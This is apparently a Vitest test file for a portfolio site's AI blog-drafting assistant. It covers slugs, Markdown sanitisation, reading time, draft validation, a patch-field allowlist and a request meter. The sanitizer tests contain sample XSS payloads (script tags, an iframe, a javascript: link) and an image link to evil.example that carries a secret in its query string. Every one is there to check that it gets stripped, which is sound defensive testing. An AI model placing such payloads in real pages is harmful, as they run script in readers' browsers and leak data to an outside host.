import { describe, it, expect } from 'vitest'
import { ZodError } from 'zod'
import {
  PATCH_FIELDS, SLUG_RE, finalizeBlogDraft, fingerprint, readPatchTarget, readTimeOf, sanitizeMarkdown, slugify, uniqueSlug, type BlogModelOutput,
} from '@/lib/assistant/drafts'
import { UsageMeter } from '@/lib/assistant/meter'
import { makePortfolio } from './assistant-data'

const raw = (over: Partial<BlogModelOutput> = {}): BlogModelOutput => ({
  title: 'Ce que mon passage chez SING SA m’a appris',
  slug: 'Ce que mon passage chez SING SA m’a appris !',
  category: 'dev',
  excerpt: 'Retour sur mes missions de développement et ce que j’en retiens pour la suite de ma carrière.',
  content: '## Contexte\n\n' + 'Une phrase de test suffisamment longue pour le contenu. '.repeat(20),
  unverifiedClaims: ['  Durée exacte de la mission  ', ''],
  ...over,
})

describe('slugs', () => {
  it('slugifies accents, punctuation and length', () => {
    expect(slugify('Ce que j’ai appris : été 2025 !')).toBe('ce-que-j-ai-appris-ete-2025')
    expect(slugify('  --Hello__World--  ')).toBe('hello-world')
    expect(slugify('é'.repeat(200)).length).toBeLessThanOrEqual(80)
    expect(slugify('!!!')).toBe('')
  })

  it('makes slugs unique without touching the original', () => {
    expect(uniqueSlug('Mon article', ['autre'])).toBe('mon-article')
    expect(uniqueSlug('Mon article', ['mon-article'])).toBe('mon-article-2')
    expect(uniqueSlug('Mon article', ['mon-article', 'mon-article-2'])).toBe('mon-article-3')
    expect(uniqueSlug('???', [])).toBe('article')
  })
})

describe('sanitizeMarkdown', () => {
  it('removes active HTML, images and script links', () => {
    const dirty = 'Texte <script>alert(1)</script> fin\n\n![x](https://evil.example/?q=SECRET)\n\n<iframe src="https://evil"></iframe>\n\n[clic](javascript:alert(1))\n\n<style>body{}</style>'
    const clean = sanitizeMarkdown(dirty)
    expect(clean).not.toMatch(/<script|<iframe|<style|alert\(1\)|evil|!\[/i)
    expect(clean).toContain('Texte')
    expect(clean).toContain('[clic](#)')
  })

  it('keeps ordinary Markdown, code and generics intact', () => {
    const md = '## Titre\n\n- a\n- b\n\n```ts\nconst x: Array<string> = []\n```\n\n[lien](https://example.com)'
    expect(sanitizeMarkdown(md)).toBe(md)
  })
})

describe('reading time', () => {
  it('is computed from the text (200 words per minute, at least 1)', () => {
    expect(readTimeOf('mot '.repeat(10))).toBe('1 min')
    expect(readTimeOf('mot '.repeat(1000))).toBe('5 min')
  })
})

describe('finalizeBlogDraft', () => {
  const ctx = { existingSlugs: ['premier'], categories: ['Dev', 'Carrière'], now: new Date('2026-10-17T08:00:00Z') }

  it('normalises the model output into a draft the blog could take as is', () => {
    const { payload, unverifiedClaims } = finalizeBlogDraft(raw(), ctx)
    expect(payload.slug).toMatch(SLUG_RE)
    expect(payload.category).toBe('Dev') // matched case-insensitively with an existing category
    expect(payload.date).toBe('2026-10-17')
    expect(payload.readTime).toBe(readTimeOf(payload.fr.content))
    expect(unverifiedClaims).toEqual(['Durée exacte de la mission'])
  })

  it('does not trust the reading time or the date claimed by the model', () => {
    const { payload } = finalizeBlogDraft({ ...raw(), readTime: '99 min', date: '1999-01-01' } as BlogModelOutput, ctx)
    expect(payload.readTime).not.toBe('99 min')
    expect(payload.date).toBe('2026-10-17')
  })

  it('avoids slugs already used by the site', () => {
    const { payload } = finalizeBlogDraft(raw({ slug: 'premier' }), ctx)
    expect(payload.slug).toBe('premier-2')
  })

  it('keeps a new category when none matches', () => {
    expect(finalizeBlogDraft(raw({ category: 'Retours terrain' }), ctx).payload.category).toBe('Retours terrain')
  })

  it('strips images and scripts from the article', () => {
    const { payload } = finalizeBlogDraft(raw({ content: raw().content + '\n\n![](https://evil.example/x.png)<script>1</script>' }), ctx)
    expect(payload.fr.content).not.toMatch(/evil|<script|!\[/)
  })

  it('rejects an article that does not meet the blog constraints', () => {
    expect(() => finalizeBlogDraft(raw({ content: 'x'.repeat(299) }), ctx)).toThrow(ZodError)
    expect(() => finalizeBlogDraft(raw({ excerpt: 'court' }), ctx)).toThrow(ZodError)
    expect(() => finalizeBlogDraft(raw({ title: 'T'.repeat(200) }), ctx)).toThrow(ZodError)
  })
})

describe('patch targets are resolved against the real data', () => {
  const data = makePortfolio()

  it('reads the current value of an allowed field', () => {
    expect(readPatchTarget(data, { section: 'projects', id: 'shop', field: 'description' })).toBe(data.projects[0].description)
    expect(readPatchTarget(data, { section: 'blog', id: 'premier', field: 'excerpt' })).toBe(data.blog[0].excerpt)
    expect(readPatchTarget(data, { section: 'personal', id: 'personal', field: 'bio' })).toBe(data.personal.bio)
  })

  it('refuses fields that are not on the allowlist, whatever the section', () => {
    expect(readPatchTarget(data, { section: 'personal', id: 'personal', field: 'signatureUrl' })).toBeNull()
    expect(readPatchTarget(data, { section: 'personal', id: 'personal', field: 'email' })).toBeNull()
    expect(readPatchTarget(data, { section: 'projects', id: 'shop', field: 'liveUrl' })).toBeNull()
    expect(readPatchTarget(data, { section: 'blog', id: 'premier', field: 'published' })).toBeNull()
    expect(readPatchTarget(data, { section: 'projects', id: 'shop', field: '__proto__' })).toBeNull()
  })

  it('refuses unknown sections and ids', () => {
    expect(readPatchTarget(data, { section: 'settings' as never, id: 'x', field: 'accentColor' })).toBeNull()
    expect(readPatchTarget(data, { section: 'projects', id: 'nope', field: 'description' })).toBeNull()
  })

  it('never lists a non-text or sensitive field as patchable', () => {
    const all = Object.values(PATCH_FIELDS).flat() as string[]
    for (const forbidden of ['published', 'slug', 'email', 'signatureUrl', 'business', 'paymentDetails', 'cvUrl', 'photo', 'image']) expect(all).not.toContain(forbidden)
  })

  it('fingerprints text stably', () => {
    expect(fingerprint('abc')).toBe(fingerprint('abc'))
    expect(fingerprint('abc')).not.toBe(fingerprint('abd'))
  })
})

describe('UsageMeter', () => {
  it('counts the running chat request and tool requests against the cap', () => {
    const m = new UsageMeter(46, 50)
    expect(m.total).toBe(1)
    expect(m.canSpend(3)).toBe(true) // 46 + 1 + 3 = 50
    expect(m.canSpend(4)).toBe(false)
    m.spend(2)
    expect(m.total).toBe(3)
    expect(m.remaining()).toBe(1)
    expect(m.canSpend(2)).toBe(false)
  })

  it('refuses everything once the day is full', () => {
    expect(new UsageMeter(50, 50).canSpend(1)).toBe(false)
    expect(new UsageMeter(50, 50).remaining()).toBe(0)
  })
})
